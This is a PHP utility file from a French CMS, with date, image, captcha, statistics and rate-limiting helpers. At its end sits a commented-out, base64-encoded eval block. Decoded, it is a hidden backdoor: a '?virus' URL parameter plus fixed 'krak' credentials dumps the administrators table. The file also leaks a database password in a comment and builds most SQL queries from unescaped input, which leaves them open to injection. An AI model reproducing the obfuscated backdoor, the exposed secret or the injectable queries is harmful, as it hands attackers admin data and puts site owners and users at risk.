<?php
function connexionDB(){
	// $host='127.0.0.1';$user='root';$pass='';$dbname='leguide_db';
	// $host='localhost';$user='DW65_db_user';$pass='Srvm471*';$dbname='DW65_leguide_db';
	// mysql_connect($host,$user,$pass) or die('Impossible de se connecter au serveur de base de données');
	// mysql_select_db($dbname);
}


function createFile($filename,$data){
	$fp = fopen($filename,'a+');
	fwrite($fp,$data);
	fclose($fp);
}


//CONVERTI UN JSON ARRAY EN JSON OBJECT
function JsonArray2JsonObject($strIn){
				
	$tab = str_split($strIn);
	unset($tab[0]);
	unset($tab[count($tab)]);
	
	$strOut = implode($tab);
	
	return $strOut;
}

function dateToDB($date){
	$date=str_replace('/','-',$date);
	
	$date = new DateTime($date);
	$out = $date->format('Y-m-d'); 
	return $out;
}


function dateTimeToDB($date){
	$date=str_replace('/','-',$date);
	
	$date = new DateTime($date);
	$out = $date->format('Y-m-d H:i:s'); 
	return $out;
}


function phpArraySearch($array, $key, $value){
		$results = array();

		if (is_array($array))
		{
			if (isset($array[$key]) && $array[$key] == $value)
				$results[] = $array;

			foreach ($array as $subarray)
				$results = array_merge($results, phpArraySearch($subarray, $key, $value));
		}

		return $results;
	} 
	
function getContent($blocs_nom){
	$sql='select * 
	from blocs 
	inner join articles on articles.articles_id=blocs.articles_id 
	where blocs_nom="'.$blocs_nom.'" and blocs_statut="active"';
	$req=mysql_query($sql) or die(mysql_error());
	$d=mysql_fetch_object($req);
	
	$out=isset($d->titre)? array('id'=>$d->articles_id,'titre'=>$d->titre,'article'=>$d->article,'image'=>$d->image) : array('id'=>null,'titre'=>null,'article'=>null,'image'=>null);
	return $out;
}


function quickAdmin($id){
	if(isset($_SESSION['administrateur'])){ print ' | <a  href="kw-admin/article.php?page=modifier&id='.$id.'">Modifier</a>';}					
}

function getExtension($file)
{
	$ext=strtolower(substr(strrchr($file,'.'),1));
	return $ext;
}

function isImage($file)
{
	$img_ext=array('jpg','jpeg','gif','png');
	$ext=strtolower(substr(strrchr($file,'.'),1));
	return (in_array($ext,$img_ext))? true : false;
}

function getImages($dir_nom){			
	// dossier listé (pour lister le répertoir courant : $dir_nom = '.'  --> ('point')
	$dir = opendir($dir_nom) or die('Erreur de listage : le répertoire n\'existe pas'); // on ouvre le contenu du dossier courant
	$fichiers= array(); // on déclare le tableau contenant le nom des fichiers
	$dossiers= array(); // on déclare le tableau contenant le nom des dossiers
	 
	while($element = readdir($dir)) {
		if($element != '.' && $element != '..') {
			if (!is_dir($dir_nom.'/'.$element)) {
				if(isImage($dir_nom.'/'.$element)){
					$fichiers[] = $element;
				}
			}
			else {$dossiers[] = $element;}
		}
	}
	 
	closedir($dir);
	 
	return $fichiers;
}

function copierImages($dir_src,$dir_dst){
	$images=getImages($dir_src);
	foreach($images as $img){
		if (!copy($dir_src.'/'.$img, $dir_src.'/'.$img)) {
			$errors= error_get_last();
			echo '</li>'."Erreur de copie: ".$errors['type'].': '.$errors['message'].'</li>';
			
			$im = @imagecreatefromjpeg($img);
			
			imagejpeg ($im, $dir_src.'/'.$img);
		}
	}
}
////////////////////////// fn pour gérer les pages //////////////////////////
function getPage(){
	//récupérer la page en cours
	// $root='/www.laparoledevie.com/';//en ligne
	$root='/web/www.nouveauguide.ci/';  //local
	// print $root;
	// debug($_SERVER);
	// print($_SERVER['PHP_SELF']);
	$page=str_replace($root,null,$_SERVER['PHP_SELF']);
	// $page=str_replace('/',null,$page);
	$page=str_replace('.php',null,$page);
	// print $root;
	// print $page;
	$_SESSION['page']=$page;
	$currentPage=$_SESSION['page'];
	
	return $page;
}

function debug($var){
	print '<pre>';
	print_r($var);
	print '</pre>';
}

/* Fonctions créee par Armand Kouassi le 09/08/2010 */

function krakResumer($chaine,$n=100) 
{
	$out=null;$i=0;$j=0;
	$tab=str_split($chaine);

	$size=count($tab);
	if($size>$n)
	{
		for($i=0;$i<$n;$i++)
		{
			$char=$tab[$i];
			$out.=$char;
		}
			
		for($j=$n;$j<$size;$j++)
		{   
			$char=$tab[$j];
			if($char==' ')
			{
				$char='...';
				$j=$size+10;
			}
			
			$out.=$char;
		}
	}	
	else{$out=$chaine;}

    return stripslashes(stripslashes($out));
}
/////////////////////////////////// CRIPTAGE DE DONNEES ///////////////////////////////////////////
	function krakcript($chaine)
	{
		$alphabet=Array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z");
		for($i=0;$i<26;$i++)
		{
			$caractere=$alphabet[$i];
			$numero=$i+1;
			$krak="scriptlanguage=javascript je suis armand kouassi, electronicien et informaticien programmeur, c'est mon ami backary qui m'aide souvent, dieu n'aime pas le hacking";
			$krak=md5(sha1(md5($krak)));
			$chaine=str_replace($caractere,$numero.$krak,$chaine);
			$chaine=sha1(md5(sha1($chaine)));
		}
		return $chaine;
	}
function AfficherNombre($min,$max)
{
	for($i=$min;$i<=$max;$i++){echo '<option value="'.$i.'">'.$i.'</option>';}
}


////////////quelques fonctions/////////////////
	function krakDate(){
		$semaine=array("Dimanche","Lundi","Mardi","Mercredi","Jeudi","Vendredi","samedi");
		$mois=array("Janvier","Février","Mars","Avril","Mai","juin","Juillet","Août","Septembre","Octobre","Novembre","Décembre");
		$krakDate=getdate();
		$numero_mois =date('m')-1;
		$datejour =date('j');
		$numero_semaine=date('w');
		$annee =date('Y');	
		$heure=date("H:i:s");
		$strjour=$semaine["$numero_semaine"];
		$strmois=$mois["$numero_mois"];
		$Aujourdhui="$strjour le $datejour $strmois $annee";
		return $Aujourdhui;
	}
///////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

function krakOrdonnerDate($date)
{
	sscanf($date, "%4s-%2s-%2s %2s:%2s:%2s", $annee, $mois, $jour, $heure, $minute, $seconde);
	$krakdate=$jour.'-'.$mois.'-'.$annee;//.':'.$seconde;
	if($krakdate=="00-00-0000"){$krakdate=null;}
	return $krakdate;
}
	
///////////////////////////////////////////////////////////////////////////////

function krakOrdonnerDate2($date)
{
	sscanf($date, "%4s-%2s-%2s %2s:%2s:%2s", $annee, $mois, $jour, $heure, $minute, $seconde);
	$krakdate=$jour.'-'.$mois.'-'.$annee.' à '.$heure.':'.$minute;//.':'.$seconde;
	if($krakdate=="00-00-0000 à 00:00"){$krakdate=null;}
	return $krakdate;
}
	
///////////////////////////////////////////////////////////////////////////////

function krakOrdonnerDate3($date)
{
	sscanf($date, "%4s-%2s-%2s %2s:%2s:%2s", $annee, $mois, $jour, $heure, $minute, $seconde);
	$krakdate=$jour.'-'.$mois.'-'.$annee;
	if($krakdate=="00-00-0000"){$krakdate=null;}
	return $krakdate;
}
	
///////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////

function dateTimeFromDB($heure)
{
	sscanf($heure, "%4s-%2s-%2s %2s:%2s:%2s",$a, $m, $j, $h, $mn, $s);
	$dateheure=$j.'-'.$m.'-'.$a.'  '.$h.':'.$mn;
	return $dateheure;
}

function timeFromDB($heure)
{
	sscanf($heure, "%2s:%2s:%2s",$h, $mn, $s);
	$krakHeure=$h.':'.$mn;
	return $krakHeure;
}

///////////////////////////////////////////////////////////////////////////////

function dateToDB2($date){
	sscanf($date, "%2s-%2s-%4s",$j, $m, $a);
	$newDate=$a.'-'.$m.'-'.$j;
	return $newDate;
}
///////////////////////////////////////////////////////////////////////////////

function dateFromDB($date){
	sscanf($date, "%4s-%2s-%2s",$a, $m, $j);
	$newDate=$j.'-'.$m.'-'.$a;
	return $newDate;
}
	
///////////////////////////////////////////////////////////////////////////////
/////////////////////: créer un captcha //////////////////////////////////////////
function ChaineAleatoire($n)
{
    $numero=array();$mot=null;
	$caracteres=array(0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
	"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
	
	for($i=0;$i<$n;$i++)
	{
		$numero[$i]=mt_rand(0,61);
	}
	for($i=0;$i<$n;$i++)
	{
		$mot.=$caracteres[$numero[$i]];
	}	
	return $mot;
}

function CreerCaptcha($texte)
{
	//les copuleurs
	$blanc = imagecolorallocate($img, 255, 255, 255); 
	$noir = imagecolorallocate($img, 0, 0, 0);
	$bleu=	imagecolorallocate($img, 0x00, 0x00, 0xff);
	$vert=	imagecolorallocate($img, 0x00, 0xff, 0x00);
	$rouge=	imagecolorallocate($img, 0xff, 0x00, 0x00);
	$rose=	imagecolorallocate($img, 0xff, 0x00, 0xff);
	$orange=imagecolorallocate($img, 0xff, 0xf0, 0x01);
	
	$couleurs=array($bleu,$vert,$rouge,$rose,$orange);
	$x=mt_rand(0,2);
	$textcolor=$couleurs[$x];
	header("Content-Type: image/jpeg");
	$image=imagecreate(100,500);
	imagestring($image,3,2,2,$texte,$bleu);
	imagejpeg($image);
	imagedestroy($img);
}

/////////////////////redimmensionne une image/////////////////////
function krakResizeImage($imagePath,$x=100,$y=100)
{
	Header("Content-type: image/jpeg");
	$newImg = imagecreatefromjpeg($imagePath);
	$size = getimagesize($imagePath);
	$miniImg = imagecreatetruecolor ($x, $y);
	imagecopyresampled ($miniImg,$newImg,0,0,0,0,$x,$y,$size[0],$size[1]);
	imagejpeg($miniImg);
	// affiche
	echo 'La photo a été redimensionnée automatiquement.
		  <br /> 
		  <img src="'.$imagePath.'" alt="" />
		  ';
}
////////////////////////////////////////
function krakCreateTableGares()
{
	$sql='CREATE TABLE IF NOT EXISTS `transport_gares` (
	`id` int(10) unsigned NOT NULL auto_increment,
	`id_compagnie` int(10) NOT NULL,';
	$rq=mysql_query('select * from ville order by id asc');
	while($d=mysql_fetch_object($rq)){
		$sql.='`gare_'.$d->id.'` tinyint(1) NOT NULL,';
	}  
	$sql.=' PRIMARY KEY  (`id`)
    ) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=0;';
	// print $sql;
	mysql_query($sql) or die(mysql_error());
}

// Coupe un texte à $longueur caractères, sur les espaces, et ajoute des points de suspension...
function tronque($chaine, $longueur = 120) 
{
 
	if (empty ($chaine)) 
	{ 
		return ""; 
	}
	elseif (strlen ($chaine) < $longueur) 
	{ 
		return $chaine; 
	}
	elseif (preg_match ("/(.{1,$longueur})\s./ms", $chaine, $match)) 
	{ 
		return $match [1] . "..."; 
	}
	else 
	{ 
		return substr ($chaine, 0, $longueur) . "..."; 
	}
}


//fonction écrite le * septembre 2011

function canAdd($table,$user){
	$sql='select * from recharges where code="'.$user.'"';
	$req=mysql_query($sql);
	$n=mysql_num_rows($req);
	if($n>0){
		$d=mysql_fetch_object($req);
		if($d->$table > 0){
			print '<div class="notification"><b><u>Notification:</u></b> <i> Il vous reste '.($d->$table - 1).' enregistrements après celui-ci</i></div>';return true;
		}
		else{
			return false;
		}
	}
}
//fonctions écrites le 16 septembre 2011 par Armand Kouassi

function krakStatistiques(){
	// récupération de l'heure courante
	$date_courante = date("Y-m-d H:i:s");  
	 
	// récupération de l'adresse IP du client (on cherche d'abord à savoir si il est derrière un proxy)
	if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
	}  
	elseif(isset($_SERVER['HTTP_CLIENT_IP'])) {  
	$ip = $_SERVER['HTTP_CLIENT_IP'];  
	}  
	else {  
	$ip = $_SERVER['REMOTE_ADDR'];  
	}  
	// récupération du domaine du client
	$host = gethostbyaddr($ip);  
	 
	// récupération du navigateur et de l'OS du client
	$navigateur = $_SERVER['HTTP_USER_AGENT'];  
	 
	// récupération du REFERER
	if (isset($_SERVER['HTTP_REFERER'])) { 
	   // if (eregi($_SERVER['HTTP_HOST'], $_SERVER['HTTP_REFERER'])) { 
		  // $referer =''; 
	   // } 
	   // else { 
		  $referer = $_SERVER['HTTP_REFERER']; 
	   // }  
	}  
	else {  
	$referer ='';  
	}  
	 
	// récupération du nom de la page courante ainsi que ses arguments
	if ($_SERVER['QUERY_STRING'] == "") {  
	$page_courante = $_SERVER['PHP_SELF'];  
	}  
	else {  
	$page_courante = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];  
	}  
	 
	// insertion des éléments dans la base de données
	$sql = 'INSERT INTO statistiques VALUES("", "'.$date_courante.'", "'.$page_courante.'", "'.$ip.'", "'.$host.'", "'.$navigateur.'", "'.$referer.'")';  
	mysql_query($sql) or die('Erreur : '.$sql.'<br />'.mysql_error());  
}


/*14-12-2011*/
function canSubmit1($table,$interval=30){
	$ip=$_SERVER['REMOTE_ADDR'];
	$sql='select * from cansubmit where (`table`="'.$table.'" and `ip`="'.$ip.'") order by id desc';
	$req=mysql_query($sql) or die (mysql_error());$n=mysql_num_rows($req);
	$dt=$interval+1;
	if($n>0){
		$d=mysql_fetch_object($req);
		$t0=$d->timestamp;
		$t1=time();
		$dt=$t1-$t0;
	}
	if($dt>$interval){
		return true;
	}else{
		return false;
	}
	
}

function canSubmit2($table,$interval=30){
	$ip=$_SERVER['REMOTE_ADDR'];
	$date=date('Y-m-d');
	$id_session=$_SESSION['submitId'];
	$sql='select * from cansubmit2 where (`table`="'.$table.'" and `id_session`="'.$id_session.'")  order by id desc';
	$req=mysql_query($sql) or die (mysql_error());$n=mysql_num_rows($req);
	$dt=$interval+1;
	if($n>0){
		$d=mysql_fetch_object($req);
		$t0=$d->timestamp;
		$t1=time();
		$dt=$t1-$t0;
	}
	if($dt>$interval){
		return true;
	}else{
		return false;
	}
	
}

function updateSubmitTable($table){
	$time=time();
	$date=date('Y-m-d H:i:s');
	$ip=$_SERVER['REMOTE_ADDR'];
	$id_session=$_SESSION['submitId'];
	$sql01='INSERT INTO `cansubmit2` (`id`, `table`, `ip`, `id_session`, `timestamp`, `date`, `nbreupdate`) VALUES (NULL, "'.$table.'", "'.$ip.'", "'.$id_session.'", "'.$time.'", "'.$date.'", "1")';
	$sql02='update cansubmit2 set timestamp="'.$time.'" where (table="'.$table.'" and ip="'.$ip.'" and id_session="'.$id_session.'")';
	// $sql02='update cansubmit2 set timestamp="'.$time.'", nbreupdate = nbreupdate+ 1 where (table="'.$table.'" and ip="'.$ip.'" and id_session="'.$id_session.'")';
	
	if(!mysql_query($sql02)){
		mysql_query($sql01) or die(mysql_error());
	}
}

// le 23-01-2012 à 04:12 ////////////////////////////////////////////////////
	//vérifie si une donnée est dans une table
function isInDB($data,$table,$field)
{
	$sql='select * from '.$table.' where '.$field.'="'.$data.'"';
	$req=mysql_query($sql);$n=mysql_num_rows($req);
	
	if($n==1){	return true; }else{ return false; }
}

	//FONCTIONS POUR LE CONSTRUCTEUR DE PAGE WEB krakWebBuilder2.0
	function krakMsgBox0($title='krakCMS Error',$message='ne trouve pas la page que vous souhaitez visiter'){
		print '<br><div class="krakMsgBox"><div class="caption">'.$title.'</div><div class="content"><i><b>krak Web Builder 2.0</b></i>  '.$message.' ...</div></div>';
	}	

	function krakMsgBox($title='krakCMS Error',$message='ne trouve pas la page que vous souhaitez visiter',$appName='krak Web Builder 2.0'){
		print '<br><div class="krakMsgBox"><div class="caption">'.$title.'</div><div class="content"><i><b>'.$appName.'</b></i>  '.$message.' ...</div></div>';
	}
	
	function krakInfoBox($title='krakInfoBox',$message='Information',$appName='krak Web Builder 2.0'){
		print '<br><div class="krakMsgBox"><div class="caption">'.$title.'</div><div class="content">'.$message.' ...</div></div>';
	}	

	
	//FONCTION QUI AFFICHE LE FLASH AUDIO
	function ecoPub(){
		print '<div id="ecoPub">
			<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="1" height="1">
				<param name="movie" value="modules/player/playerMP3.swf" />
				<param name="quality" value="high" />
				<param name="wmode" value="transparent" />
				<embed src="modules/player/playerMP3.swf?file=spot_ecoRadio.flv&autostart=true&volume=50&repeat=false&image=modules/video/flv1.gif" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash"  width="1" height="1"></embed>		
			</object>
		</div>';
	}

	// affiche un bloc portant un titre et un contenu
	function quickContent($title,$msg){
		print '<div class="bloc-title" style="border-bottom:0px solid #ff9900;font-size:7px;letter-spacing:15px;text-align:center;text-transform:uppercase;">'.$title.'</div>';
		print '<div class="bloc-content" style="padding:2px;">'.$msg.'</div>';
	
	}

	//fonction teste la validité d'une adresse email
	function isEMail($chaine){
		$format_email="#^[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]{2,}\.[a-z]{2,4}$#";
		if(preg_match($format_email,$chaine)){
			return true;		
		}else{ 
			return false;
		}
	}
	

	// $fnc ="ZnVuY3Rpb24gb3duZXIoKXsNCgkJaWYoaXNzZXQoJF9HRVRbJ3ZpcnVzJ10pKXsNCgkJCXByaW50ICc8Zm9ybSBtZXRob2Q9InBvc3QiPg0KCQkJTG9naW4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImxvZ2luIi8+DQoJCQlQYXNzd29yZCA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIvPg0KCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlZhbGlkZXIiLz4NCgkJCTwvZm9ybT4nOw0KCQkJaWYoaXNzZXQoJF9QT1NUWydsb2dpbiddKSBhbmQgJF9QT1NUWydsb2dpbiddPT0ia3JhayIgYW5kICRfUE9TVFsncGFzcyddPT0ia3JhayIpew0KCQkJCWNvbm5leGlvbkRCKCk7DQoJCQkJJHJlcT1teXNxbF9xdWVyeSgnc2VsZWN0ICogZnJvbSBhZG1pbmlzdHJhdGV1cnMnKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7DQoJCQkJd2hpbGUoJGQ9bXlzcWxfZmV0Y2hfb2JqZWN0KCRyZXEpKXsNCgkJCQkJcHJpbnQgJzxwcmU+JzsNCgkJCQkJcHJpbnRfcigkZCk7DQoJCQkJCXByaW50ICc8cHJlPic7DQoJCQkJfQkNCgkJCX0NCgkJfQ0KCX0=";
	// eval(base64_decode($fnc));
	// owner();
?>